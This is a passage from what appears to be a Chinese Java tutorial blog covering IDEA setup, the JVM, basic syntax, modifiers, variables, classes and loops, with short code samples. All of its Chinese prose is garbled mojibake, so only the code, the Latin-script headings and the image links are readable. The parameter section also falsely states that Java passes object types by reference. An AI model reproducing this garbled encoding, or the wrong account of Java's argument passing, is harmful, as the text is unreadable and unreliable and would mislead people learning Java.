æ²¡æœ‰ç‰¹æ®Šå«ä¹‰\n\nåœ¨é¡¹ç›®ä¸­å¸¸å¸¸ç”¨æ¥æ”¾é™æ€éŸ³è§†é¢‘å›¾ç‰‡ä¹‹ç±»çš„\n\nç„¶åæˆ‘ä»¬å°±å¯ä»¥å³å‡»æˆ‘ä»¬çš„moduleå¼€å§‹åˆ›å»ºæºæ–‡ä»¶è¿›è¡Œåˆ›ä½œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434659019-af08e6c9-610f-4145-8b84-d9d45b211cb6.png)\n\n## projectå’Œmoduleçš„å…³ç³»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434594830-8437aba0-237d-4d4d-b31c-1d28272fb8ce.png)\n\n## é›†æˆJVM\n\nå¦‚æœæˆ‘ä»¬ä¸ç”¨IDEAè¿›è¡Œjavaå¼€å‘çš„è¯ï¼Œæˆ‘ä»¬é¦–å…ˆæ˜¯åˆ›å»º`.java`çš„æºä»£ç ï¼Œç„¶åé€šè¿‡javac.exeæ¥ç¼–è¯‘ä¸º`.class`åç¼€çš„æ–‡ä»¶æ‰å¯ä»¥è¿è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435200732-04c8c20d-6fb4-4dfd-94fd-6f4eb6eee33f.png)\n\nä½†æ˜¯IDEAç›´æ¥é›†æˆäº†JAVAè™šæ‹Ÿæœºä¹Ÿå°±æ˜¯JVMï¼Œç›´æ¥å†™å®Œå¸®æˆ‘ä»¬ç¼–è¯‘ç„¶åè¿è¡Œï¼Œéå¸¸æ–¹ä¾¿ã€‚\n\nè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆjavaæœ‰è·¨å¹³å°æ€§ï¼Œç¼–è¯‘ä¸€æ¬¡åˆ°å¤„æ‰§è¡Œ\n\nå°±æ˜¯å› ä¸ºJVMçš„åŸå› ï¼Œä¸ç”¨å»çœ‹æœºå™¨ç¯å¢ƒï¼Œè‡ªå·±å°±æœ‰ä¸€ä¸ªç¯å¢ƒï¼ŒæŠŠè‡ªå·±åŒ…è£¹èµ·æ¥çš„å‘¢ç§ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435143768-4ba669ca-eaff-448e-8d14-a79f2535b96a.png)\n\n# åŸºæœ¬è¯­æ³•\n\nç¼–å†™ Java ç¨‹åºæ—¶ï¼Œåº”æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š\n\n- å¤§å°å†™æ•æ„Ÿï¼šJava æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œè¿™å°±æ„å‘³ç€æ ‡è¯†ç¬¦ Hello ä¸ hello æ˜¯ä¸åŒçš„ã€‚\n- ç±»åï¼šå¯¹äºæ‰€æœ‰çš„ç±»æ¥è¯´ï¼Œç±»åçš„é¦–å­—æ¯åº”è¯¥å¤§å†™ã€‚å¦‚æœç±»åç”±è‹¥å¹²å•è¯ç»„æˆï¼Œé‚£ä¹ˆæ¯ä¸ªå•è¯çš„é¦–å­—æ¯åº”è¯¥å¤§å†™ï¼Œä¾‹å¦‚ MyFirstJavaClassï¼Œä¹Ÿå°±æ˜¯è¦é©¼å³°å¼å‘½åã€‚\n- æ–¹æ³•åï¼šæ‰€æœ‰çš„æ–¹æ³•åéƒ½åº”è¯¥ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚å¦‚æœæ–¹æ³•åå«æœ‰è‹¥å¹²å•è¯ï¼Œåˆ™åé¢çš„æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ã€‚\n- æºæ–‡ä»¶åï¼šæºæ–‡ä»¶åå¿…é¡»å’Œç±»åç›¸åŒã€‚å½“ä¿å­˜æ–‡ä»¶çš„æ—¶å€™ï¼Œä½ åº”è¯¥ä½¿ç”¨ç±»åä½œä¸ºæ–‡ä»¶åä¿å­˜ï¼ˆåˆ‡è®° Java æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼‰ï¼Œæ–‡ä»¶åçš„åç¼€ä¸º .javaã€‚ï¼ˆå¦‚æœæ–‡ä»¶åå’Œç±»åä¸ç›¸åŒåˆ™ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼‰ã€‚\n- ä¸»æ–¹æ³•å…¥å£ï¼šæ‰€æœ‰çš„ Java ç¨‹åºç”± `public static void main(String[] args) `æ–¹æ³•å¼€å§‹æ‰§è¡Œã€‚\n\n## JAVAæ ‡è¯†ç¬¦\n\né€šä¿—è¯´å°±æ˜¯åå­—ï¼Œç±»åå˜é‡åæ–¹æ³•åéƒ½è¢«ç§°ä¸ºæ ‡è¯†ç¬¦\n\n- å­—æ¯æ•°å­—ç¾å…ƒç¬¦å·æˆ–è€…ä¸‹åˆ’çº¿å¼€å¤´å…¶ä»–éæ³•\n- å…³é”®å­—ä¸èƒ½ä½œä¸ºæ ‡è¯†ç¬¦ å…³é”®å­—å°±æ˜¯ä¸€äº›å·²ç»è¢«javaå ç”¨çš„åå­— æœ‰ç‰¹æ®Šå«ä¹‰çš„æˆ‘ä»¬ä¸èƒ½ç”¨\n- å¤§å°å†™æ•æ„Ÿ\n\n## JAVAä¿®é¥°ç¬¦\n\n- è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ : default, public , protected, private\n- éè®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ : final, abstract, static, synchronized\n\nå¯ä»¥ç”¨æ¥ä¿®é¥°ç±»ä¸­æ–¹æ³•å’Œå±æ€§\n\n## JAVAå˜é‡\n\n- å±€éƒ¨å˜é‡\n- ç±»å˜é‡ï¼ˆé™æ€å˜é‡ï¼‰\n- æˆå‘˜å˜é‡ï¼ˆéé™æ€å˜é‡ï¼‰\n\n## JAVAæ•°ç»„\n\næ•°ç»„æ˜¯å‚¨å­˜åœ¨å †ä¸Šçš„å¯¹è±¡ï¼Œå¯ä»¥ä¿å­˜å¤šä¸ªåŒç±»å‹å˜é‡\n\n## JAVAå…³é”®å­—\n\nhttps://www.runoob.com/java/java-basic-syntax.html é‡åˆ°äº†ç›´æ¥æŸ¥è¡¨å°±è¡Œäº†\n\n## ä»HelloWorldå¼€å§‹\n\n```java\npublic class HelloWorld {\n    public static void main(String[] args){\n        System.out.println(\"hello world\");\n    }\n}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435638507-27066ea6-5788-41d4-9fdd-1b1fc3c35ce9.png)\n\né¦–å…ˆå°±æ˜¯è¦éœ€è¦æ¢³ç†ä¸€ä¸ªç†å¿µå°±æ˜¯åœ¨javaä¸­ä¸€åˆ‡éƒ½æ˜¯ç±» \n\npsvmå¿«æ·é”®å¯ä»¥ç›´æ¥ç”Ÿæˆ `public static void main(String[] args){}`\n\nsoutå¿«æ·é”®å¯ä»¥ç›´æ¥ç”Ÿæˆ`System.out.println(\"hello world\")`\n\né¦–å…ˆæˆ‘ä»¬çš„æ–‡ä»¶åæ˜¯ä»€ä¹ˆé‚£ä¹ˆæˆ‘ä»¬çš„ç±»åä¹Ÿæ˜¯ä»€ä¹ˆ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694437426240-3a091928-0f53-45b5-9da4-d93640a78d10.png)\n\n## public class å’Œ classçš„åŒºåˆ«\n\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ›å»ºå¤šä¸ªç±»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694438066917-b9cb277c-c61e-4f07-85ef-d2e71720c87a.png)\n\nä½†æ˜¯å…¬å…±ç±»åªèƒ½æœ‰ä¸€ä¸ªå¹¶ä¸”å…¬å…±ç±»çš„ç±»åå¿…é¡»ä¸æ–‡ä»¶åä¿æŒä¸€è‡´\n\nå¹¶ä¸”ä»»ä½•ç±»ä¸­éƒ½å¯ä»¥è®¾ç½®ç¨‹åºå…¥å£ ä¹Ÿå°±æ˜¯éƒ½å¯ä»¥å†™mainæ–¹æ³•\n\n**ä½†æ˜¯è™½ç„¶æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªjavaæºæ–‡ä»¶ä¸­å®šä¹‰å¤šä¸ªç±»ï¼Œä½†æ˜¯è¿™ç§åšæ³•æ˜¯ä¸è§„èŒƒçš„ï¼Œæ¯”è¾ƒè§„èŒƒçš„æ˜¯ä¸€ä¸ªæºæ–‡ä»¶åªèƒ½å®šä¹‰ä¸€ä¸ªclass**\n\n## æ³¨é‡Š\n\n```\n//å•è¡Œæ³¨é‡Š\n/**/å¤šè¡Œæ³¨é‡Š\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694437533622-d38ce5da-db23-4c92-9786-e71a11b775d5.png)\n\n# JAVAå¯¹è±¡å’Œç±»\n\n## æ„é€ æ–¹æ³•\n\nå¦‚æœæ²¡æœ‰æ˜¾å¼æ„é€ æ–¹æ³• javaç¼–è¯‘å™¨ä¼šä¸ºè¯¥ç±»æä¾›ä¸€ä¸ªé»˜è®¤æ„é€ æ–¹æ³•\n\nä¸€ä¸ªç±»æ„é€ æ–¹æ³•å¯ä»¥æœ‰å¤šä¸ª\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694439082703-3fafddcb-d009-470a-89ac-6075109b7f02.png)\n\n## åˆ›å»ºå¯¹è±¡\n\n```java\npublic class Student {\n    public Student(String name){\n        System.out.println(\"è¿™æ˜¯ä¸€ä¸ªå­¦ç”Ÿåä¸º\"+name);\n\n    }\n\n    public static void main(String[] args) {\n        Student stu = new Student(\"byd\");\n\n    }\n}\n```\n\n## è®¿é—®å®ä¾‹å˜é‡å’Œæ–¹æ³•\n\n```java\n/* å®ä¾‹åŒ–å¯¹è±¡ */\nObject referenceVariable = new Constructor();\n/* è®¿é—®ç±»ä¸­çš„å˜é‡ */\nreferenceVariable.variableName;\n/* è®¿é—®ç±»ä¸­çš„æ–¹æ³• */\nreferenceVariable.methodName();\n```\n\neg:\n\n```java\npublic class Student {\n    public String LZG= \"byd\";\n    public Student(String name){\n        System.out.println(\"è¿™æ˜¯ä¸€ä¸ªå­¦ç”Ÿåä¸º\"+name);\n    }\n\n    public static void main(String[] args) {\n        Student stu = new Student(\"byd\");\n        System.out.println(stu.LZG);\n    }\n}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694440160730-c3d9298a-c2b5-4a40-bd27-289eebedb817.png)\n\n\n\n## importå¯¼åŒ…\n\né¦–å…ˆåœ¨Z1d10tç›¸å¯¹è·¯å¾„è¿˜æœ‰ä¸€ä¸ªlearn package\n\nå†…å®¹å¦‚ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694441978087-8f301e62-5397-4bd9-b51d-29e7a4e8f659.png)\n\nç„¶åæˆ‘ä»¬å¯¼å…¥åˆ°Z1d10t packageä¸­\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694442054839-ff85adad-577f-43e0-a5ec-8b4936f135d7.png)\n\nç„¶åè°ƒç”¨ å¯è§å¯ä»¥æ­£å¸¸è¾“å‡º\n\n## åŸºæœ¬æ•°æ®ç±»å‹\n\næœ‰å†…ç½®æ•°æ®ç±»å‹å’Œå¼•ç”¨æ•°æ®ç±»å‹\n\n### å†…ç½®æ•°æ®ç±»å‹\n\nç”¨åˆ°äº†ç›´æ¥æŸ¥\n\nhttps://www.runoob.com/java/java-basic-datatypes.html\n\n### å¼•ç”¨ç±»å‹\n\n- åœ¨Javaä¸­ï¼Œå¼•ç”¨ç±»å‹çš„å˜é‡éå¸¸ç±»ä¼¼äºC/C++çš„æŒ‡é’ˆã€‚å¼•ç”¨ç±»å‹æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼ŒæŒ‡å‘å¯¹è±¡çš„å˜é‡æ˜¯å¼•ç”¨å˜é‡ã€‚è¿™äº›å˜é‡åœ¨å£°æ˜æ—¶è¢«æŒ‡å®šä¸ºä¸€ä¸ªç‰¹å®šçš„ç±»å‹ï¼Œæ¯”å¦‚ Employeeã€Puppy ç­‰ã€‚å˜é‡ä¸€æ—¦å£°æ˜åï¼Œç±»å‹å°±ä¸èƒ½è¢«æ”¹å˜äº†ã€‚\n- å¯¹è±¡ã€æ•°ç»„éƒ½æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ã€‚\n- æ‰€æœ‰å¼•ç”¨ç±»å‹çš„é»˜è®¤å€¼éƒ½æ˜¯nullã€‚\n- ä¸€ä¸ªå¼•ç”¨å˜é‡å¯ä»¥ç”¨æ¥å¼•ç”¨ä»»ä½•ä¸ä¹‹å…¼å®¹çš„ç±»å‹ã€‚\n- ä¾‹å­ï¼š`Student stu = new Student(\"byd\");`\n\n## å¸¸é‡\n\nåœ¨ç¨‹åºè¿è¡Œæ—¶æ˜¯ä¸èƒ½ä¿®æ”¹çš„\n\nåœ¨javaä¸­æ˜¯ç”¨finalæ¥ä¿®é¥°å˜é‡çš„\n\n```\nfinal double PI = 3.1415927;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694443639622-ba334d81-5e28-4504-af76-85c64bbd8e1b.png)\n\n## è‡ªåŠ¨ç±»å‹è½¬æ¢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694443848520-a68cb536-1261-4540-bc58-ee0c02520f07.png)\n\nå°è½¬å¤§å¯ä»¥ ä½†æ˜¯å¤§è½¬å°éœ€è¦å¼ºåˆ¶è½¬æ¢å¹¶ä¸”è¿˜ä¼šæŸå¤±ç²¾åº¦\n\n# JAVAå˜é‡ç±»å‹\n\nå˜é‡ç±»å‹:\n\n- å±€éƒ¨å˜é‡ï¼ˆLocal Variablesï¼‰ï¼šå®šä¹‰åœ¨æ–¹æ³•ã€æ„é€ æ–¹æ³•æˆ–è¯­å¥å—ä¸­çš„å˜é‡ï¼Œä½œç”¨åŸŸåªé™äºå½“å‰æ–¹æ³•ã€æ„é€ æ–¹æ³•æˆ–è¯­å¥å—ä¸­ã€‚å±€éƒ¨å˜é‡å¿…é¡»åœ¨ä½¿ç”¨å‰å£°æ˜ï¼Œå¹¶ä¸”ä¸èƒ½è¢«è®¿é—®ä¿®é¥°ç¬¦ä¿®é¥°ã€‚\n- æˆå‘˜å˜é‡ï¼ˆInstance Variablesï¼‰ï¼šå®šä¹‰åœ¨ç±»ä¸­ã€æ–¹æ³•ä¹‹å¤–çš„å˜é‡ï¼Œä½œç”¨åŸŸä¸ºæ•´ä¸ªç±»ï¼Œå¯ä»¥è¢«ç±»ä¸­çš„ä»»ä½•æ–¹æ³•ã€æ„é€ æ–¹æ³•å’Œè¯­å¥å—è®¿é—®ã€‚æˆå‘˜å˜é‡å¯ä»¥è¢«è®¿é—®ä¿®é¥°ç¬¦ä¿®é¥°ã€‚\n- é™æ€å˜é‡ï¼ˆClass Variablesï¼‰ï¼šå®šä¹‰åœ¨ç±»ä¸­ã€æ–¹æ³•ä¹‹å¤–çš„å˜é‡ï¼Œå¹¶ä¸”ä½¿ç”¨ static å…³é”®å­—ä¿®é¥°ï¼Œä½œç”¨åŸŸä¸ºæ•´ä¸ªç±»ï¼Œå¯ä»¥è¢«ç±»ä¸­çš„ä»»ä½•æ–¹æ³•ã€æ„é€ æ–¹æ³•å’Œè¯­å¥å—è®¿é—®ï¼Œé™æ€å˜é‡çš„å€¼åœ¨ç¨‹åºè¿è¡ŒæœŸé—´åªæœ‰ä¸€ä¸ªå‰¯æœ¬ã€‚é™æ€å˜é‡å¯ä»¥è¢«è®¿é—®ä¿®é¥°ç¬¦ä¿®é¥°ã€‚\n- å‚æ•°å˜é‡ï¼ˆParametersï¼‰ï¼šæ–¹æ³•å®šä¹‰æ—¶å£°æ˜çš„å˜é‡ï¼Œä½œä¸ºè°ƒç”¨è¯¥æ–¹æ³•æ—¶ä¼ é€’ç»™æ–¹æ³•çš„å€¼ã€‚å‚æ•°å˜é‡çš„ä½œç”¨åŸŸåªé™äºæ–¹æ³•å†…éƒ¨ ç®€å•è¯´å°±æ˜¯å‡½æ•°ç”¨äºä¼ å€¼çš„å½¢å‚\n\n## å‚æ•°å˜é‡\n\nçœæµï¼šå½¢å‚\n\næœ‰ä¸¤ä¸ªç‚¹ï¼š\n\n- å€¼ä¼ é€’ï¼šåœ¨æ–¹æ³•è°ƒç”¨æ—¶ï¼Œä¼ é€’çš„æ˜¯å®é™…å‚æ•°çš„å€¼çš„å‰¯æœ¬ã€‚å½“å‚æ•°å˜é‡è¢«èµ‹äºˆæ–°çš„å€¼æ—¶ï¼Œåªä¼šä¿®æ”¹å‰¯æœ¬çš„å€¼ï¼Œä¸ä¼šå½±å“åŸå§‹å€¼ã€‚Java ä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹éƒ½é‡‡ç”¨å€¼ä¼ é€’æ–¹å¼ä¼ é€’å‚æ•°å˜é‡çš„å€¼ã€‚\n- å¼•ç”¨ä¼ é€’ï¼šåœ¨æ–¹æ³•è°ƒç”¨æ—¶ï¼Œä¼ é€’çš„æ˜¯å®é™…å‚æ•°çš„å¼•ç”¨ï¼ˆå³å†…å­˜åœ°å€ï¼‰ã€‚å½“å‚æ•°å˜é‡è¢«èµ‹äºˆæ–°çš„å€¼æ—¶ï¼Œä¼šä¿®æ”¹åŸå§‹å€¼çš„å†…å®¹ã€‚Java ä¸­çš„å¯¹è±¡ç±»å‹é‡‡ç”¨å¼•ç”¨ä¼ é€’æ–¹å¼ä¼ é€’å‚æ•°å˜é‡çš„å€¼ã€‚\n\n## ç±»å˜é‡ï¼ˆé™æ€å˜é‡ï¼‰\n\njavaä¸­é™æ€å˜é‡æ˜¯å±äºç±»çš„ï¼Œè€Œä¸æ˜¯å¯¹è±¡çš„å®ä¾‹\n\nç”±äºé™æ€å˜é‡æ˜¯ä¸ç±»ç›¸å…³çš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ç±»åæ¥è®¿é—®é™æ€å˜é‡ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å®ä¾‹åæ¥è®¿é—®é™æ€å˜é‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694445310175-98a20470-9e06-4a04-8dc0-d3040a499a61.png)\n\n# JAVAä¿®é¥°ç¬¦\n\n## è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦\n\nç›´æ¥ç”¨ä¸€å¼ å›¾ç‰‡æ¥çœ‹è®¿é—®æƒé™å…³ç³»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694479898379-9130d89e-df79-4522-ab12-76d129bfa1f1.png)\n\n### é»˜è®¤è®¿é—®ä¿®é¥°ç¬¦default\n\né»˜è®¤è®¿é—®ä¿®é¥°ç¬¦çš„è®¿é—®çº§åˆ«æ˜¯åŒ…çº§åˆ«ï¼ˆpackage-levelï¼‰ï¼Œå³åªèƒ½è¢«åŒä¸€åŒ…ä¸­çš„å…¶ä»–ç±»è®¿é—®\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694480351100-3b7883b3-58b8-4575-b7d1-1e14edd2a043.png)\n\n### ç§æœ‰è®¿é—®ä¿®é¥°ç¬¦private\n\nå¤–éƒ¨æ— æ³•ç›´æ¥è®¿é—®åˆ° åªèƒ½é€šè¿‡æœ¬ç±»çš„publicå‡½æ•°é—´æ¥å»è®¿é—®\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694480716523-da2203d9-db02-4bd0-b5e3-bd27fb410338.png)\n\nå¯è§ç›´æ¥è®¿é—®æ˜¯ä¼šæŠ¥é”™çš„\n\n### å…¬æœ‰è®¿é—®ä¿®é¥°ç¬¦public\n\nå¾ˆå¸¸è§å°±ä¸è¯´äº† æ€»ä¹‹å°±æ˜¯é—¨æˆ·å¤§å¼€\n\n### å—ä¿æŠ¤çš„è®¿é—®ä¿®é¥°ç¬¦protected\n\n- å­ç±»ä¸åŸºç±»åœ¨åŒä¸€åŒ…ä¸­ï¼šè¢«å£°æ˜ä¸º protected çš„å˜é‡ã€æ–¹æ³•å’Œæ„é€ å™¨èƒ½è¢«åŒä¸€ä¸ªåŒ…ä¸­çš„ä»»ä½•å…¶ä»–ç±»è®¿é—®\n- å­ç±»ä¸åŸºç±»ä¸åœ¨åŒä¸€åŒ…ä¸­ï¼šé‚£ä¹ˆåœ¨å­ç±»ä¸­ï¼Œå­ç±»å®ä¾‹å¯ä»¥è®¿é—®å…¶ä»åŸºç±»ç»§æ‰¿è€Œæ¥çš„ protected æ–¹æ³•ï¼Œè€Œä¸èƒ½è®¿é—®åŸºç±»å®ä¾‹çš„protectedæ–¹æ³•\n\nä¸€èˆ¬å¾ˆå°‘ç”¨ æˆ‘åœ¨è¿™é‡Œå°±ä¸å¤šè¯´äº†\n\n### è®¿é—®æ§åˆ¶å’Œç»§æ‰¿\n\n- çˆ¶ç±»ä¸­å£°æ˜ä¸º public çš„æ–¹æ³•åœ¨å­ç±»ä¸­ä¹Ÿå¿…é¡»ä¸º publicã€‚\n- çˆ¶ç±»ä¸­å£°æ˜ä¸º protected çš„æ–¹æ³•åœ¨å­ç±»ä¸­è¦ä¹ˆå£°æ˜ä¸º protectedï¼Œè¦ä¹ˆå£°æ˜ä¸º publicï¼Œä¸èƒ½å£°æ˜ä¸º privateã€‚\n- çˆ¶ç±»ä¸­å£°æ˜ä¸º private çš„æ–¹æ³•ï¼Œä¸èƒ½å¤Ÿè¢«å­ç±»ç»§æ‰¿ã€‚\n\n## éè®¿é—®ä¿®é¥°ç¬¦\n\n### staticä¿®é¥°ç¬¦\n\n- é™æ€å˜é‡ï¼šstatic å…³é”®å­—ç”¨æ¥å£°æ˜ç‹¬ç«‹äºå¯¹è±¡çš„é™æ€å˜é‡ï¼Œæ— è®ºä¸€ä¸ªç±»å®ä¾‹åŒ–å¤šå°‘å¯¹è±¡ï¼Œå®ƒçš„é™æ€å˜é‡åªæœ‰ä¸€ä»½æ‹·è´ã€‚ é™æ€å˜é‡ä¹Ÿè¢«ç§°ä¸ºç±»å˜é‡ã€‚å±€éƒ¨å˜é‡ä¸èƒ½è¢«å£°æ˜ä¸º static å˜é‡ã€‚\n- é™æ€æ–¹æ³•ï¼šstatic å…³é”®å­—ç”¨æ¥å£°æ˜ç‹¬ç«‹äºå¯¹è±¡çš„é™æ€æ–¹æ³•ã€‚é™æ€æ–¹æ³•ä¸èƒ½ä½¿ç”¨ç±»çš„éé™æ€å˜é‡ã€‚é™æ€æ–¹æ³•ä»å‚æ•°åˆ—è¡¨å¾—åˆ°æ•°æ®ï¼Œç„¶åè®¡ç®—è¿™äº›æ•°æ®ã€‚\n\nç±»å˜é‡å’Œæ–¹æ³•çš„è®¿é—®å¯ä»¥ç›´æ¥ä½¿ç”¨ classname.variablename å’Œ classname.methodname çš„æ–¹å¼è®¿é—®\n\n### finalä¿®é¥°ç¬¦\n\nå˜é‡ä¸€æ—¦èµ‹å€¼åï¼Œä¸èƒ½è¢«é‡æ–°èµ‹å€¼\n\nfinal ä¿®é¥°ç¬¦é€šå¸¸å’Œ static ä¿®é¥°ç¬¦ä¸€èµ·ä½¿ç”¨æ¥åˆ›å»ºç±»å¸¸é‡\n\nä½†æ˜¯å¦‚æœä¸ç”¨staticé‚£ä¹ˆå°±è¦ç”¨éé™æ€å‡½æ•°æ‰èƒ½è°ƒç”¨ ä¹Ÿå°±æ˜¯ä¸ç”¨staticä¿®é¥°çš„ ä¸ç„¶ä¼šæŠ¥é”™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694494921294-1f9e0d0c-e368-4b60-902d-d2316bd856b0.png)\n\nå¯è§æ— æ³•è¢«æ”¹å˜\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526104172-6998c42b-f2eb-42c3-a65b-0255a76beb00.png)\n\n### abstractä¿®é¥°ç¬¦\n\nä¸€ä¸ªç±»ä¸èƒ½åŒæ—¶è¢«finalå’Œabstractä¿®é¥°\n\nå¦‚æœç±»åŒ…å«æŠ½è±¡å‡½æ•°é‚£ä¹ˆè¿™ä¸ªç±»ä¸€å®šè¦ç”³æ˜ä¸ºæŠ½è±¡ç±» ä¸ç„¶ä¼šæŠ¥é”™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526671858-76b213e7-7cdf-4112-ba3c-a35514bf8bfa.png)\n\næŠ½è±¡ç±»å¯ä»¥åŒ…å«æŠ½è±¡æ–¹æ³•å’ŒéæŠ½è±¡æ–¹æ³•\n\næŠ½è±¡æ–¹æ³•æ˜¯ä¸€ç§æ²¡æœ‰ä»»ä½•å®ç°çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„å…·ä½“å®ç°ç”±å­ç±»æä¾›\n\nå¦‚æœæœ‰ä¸»ä½“ä¼šæŠ¥é”™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526783274-4a224551-70b9-4cda-817c-3eba54d38bd0.png)\n\næŠ½è±¡æ–¹æ³•ç”±å…¶å­ç±»å®ç°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527074759-a4ec7029-dd3d-4d08-8c2d-97fd24dec9a7.png)\n\n### synchronized\tä¿®é¥°ç¬¦\n\nsynchronized å…³é”®å­—å£°æ˜çš„æ–¹æ³•åŒä¸€æ—¶é—´åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹è®¿é—®\n\n### transientä¿®é¥°ç¬¦\n\nåºåˆ—åŒ–çš„å¯¹è±¡åŒ…å«è¢« transient ä¿®é¥°çš„å®ä¾‹å˜é‡æ—¶ï¼Œjava è™šæ‹Ÿæœº(JVM)è·³è¿‡è¯¥ç‰¹å®šçš„å˜é‡ã€‚\n\n```java\npublic transient int limit = 55;   // ä¸ä¼šæŒä¹…åŒ–\npublic int b; // æŒä¹…åŒ–\n```\n\n### volatileä¿®é¥°ç¬¦\n\nvolatile ä¿®é¥°çš„æˆå‘˜å˜é‡åœ¨æ¯æ¬¡è¢«çº¿ç¨‹è®¿é—®æ—¶ï¼Œéƒ½å¼ºåˆ¶ä»å…±äº«å†…å­˜ä¸­é‡æ–°è¯»å–è¯¥æˆå‘˜å˜é‡çš„å€¼ã€‚è€Œä¸”ï¼Œå½“æˆå‘˜å˜é‡å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šå¼ºåˆ¶çº¿ç¨‹å°†å˜åŒ–å€¼å›å†™åˆ°å…±äº«å†…å­˜ã€‚è¿™æ ·åœ¨ä»»ä½•æ—¶åˆ»ï¼Œä¸¤ä¸ªä¸åŒçš„çº¿ç¨‹æ€»æ˜¯çœ‹åˆ°æŸä¸ªæˆå‘˜å˜é‡çš„åŒä¸€ä¸ªå€¼ã€‚\n\n# JAVAè¿ç®—ç¬¦\n\nå¤§è‡´å’Œå…¶ä»–è¯­è¨€å·®ä¸å¤š å°±ä¸è¿‡å¤šèµ˜è¿°äº†\n\n# JAVAå¾ªç¯ç»“æ„\n\n## while\n\n```java\nwhile( å¸ƒå°”è¡¨è¾¾å¼ ) {\n  //å¾ªç¯å†…å®¹\n}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527699055-8b292709-866d-4ddf-b398-e51c0b7a344a.png)\n\n## do...whileå¾ªç¯\n\n```java\ndo {\n       //ä»£ç è¯­å¥\n}while(å¸ƒå°”è¡¨è¾¾å¼);\n```\n\næ­¤ç»“æ„ä¼šåœ¨åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ä¹‹å‰æ‰§è¡Œä¸€æ¬¡ æ‰€ä»¥è¿™ä¸ªç»“æ„è‡³å°‘æ‰§è¡Œä¸€æ¬¡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527858896-5b8a76cd-27bb-4b98-904a-cf1e1b5fe69a.png)\n\n## for\n\n```java\nfor(åˆå§‹åŒ–; å¸ƒå°”è¡¨è¾¾å¼; æ›´æ–°) {\n    //ä»£ç è¯­å¥\n}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694528192668-49c5d725-b95f-49c0-ac9a-8518d68f133b.png)\n\n## JAVAå¢å¼ºforå¾ªç¯\n\n```java\nfor(å£°æ˜è¯­å¥ : è¡¨è¾¾å¼)\n{\n   //ä»£ç å¥å­\n}\n```\n\nå£°æ˜è¯­å¥ï¼šå£°æ˜æ–°çš„å±€éƒ¨å˜é‡ï¼Œè¯¥å˜é‡çš„ç±»å‹å¿…é¡»å’Œæ•°ç»„å…ƒç´ çš„ç±»å‹åŒ¹é…ã€‚å…¶ä½œç”¨åŸŸé™å®šåœ¨å¾ªç¯è¯­å¥å—ï¼Œå…¶å€¼ä¸æ­¤æ—¶æ•°ç»„å…ƒç´ çš„å€¼ç›¸ç­‰ã€‚\n\nè¡¨è¾¾å¼ï¼šè¡¨è¾¾å¼æ˜¯è¦è®¿é—®çš„æ•°ç»„åï¼Œæˆ–è€…æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„çš„æ–¹æ³•ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694528414285-3494e0e1-61f2-47b0-a6e5-f1e6e85a9a9c.png)\n\n## continueå’Œbreak\n\nå’Œå…¶ä»–è¯­è¨€åˆ©ç”¨ä¸€æ · ä¸å¤šè¯´\n\n# 